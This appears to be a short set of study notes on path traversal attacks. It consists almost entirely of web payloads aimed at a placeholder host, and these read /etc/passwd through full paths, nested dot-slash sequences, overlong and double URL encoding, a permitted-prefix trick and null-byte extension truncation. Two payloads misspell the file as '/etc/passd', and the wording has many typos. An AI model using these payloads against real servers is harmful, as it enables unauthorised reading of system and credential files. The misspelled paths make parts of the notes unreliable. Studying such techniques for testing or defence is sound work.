the attacker could read arbitrary file or write to a oribitary file, if the paramter is not sanitized properly

http://evil.net/get-file?name=test.php ----> normal request

http://evil.net/get-file?name=../../../../etc/passwd --> evil request

bypass techniques:

try full path 

http://evil.net/get-file?name=/etc/passwd

if pattern is stripped of badly we can bypass it using

http://evil.net/get-file?name=..././..././..././etc/passd

http://evil.net/get-file?name=....//....//....//etc/passd

if the server is decoding the user input, we can bypass restricted characters with encoded values

..%c0%af ----> ../
..%252f ----> ../

if the decoding libarary used is flawed input can be bypassed using there encoded values

/var/www/images/../../../etc/passwd

if the certain name or path is checked before processing the file we can bypass it with including it too

../../../etc/passwd%00.jpg

if a extention of file is checked it can be bypassed using %00 null termination


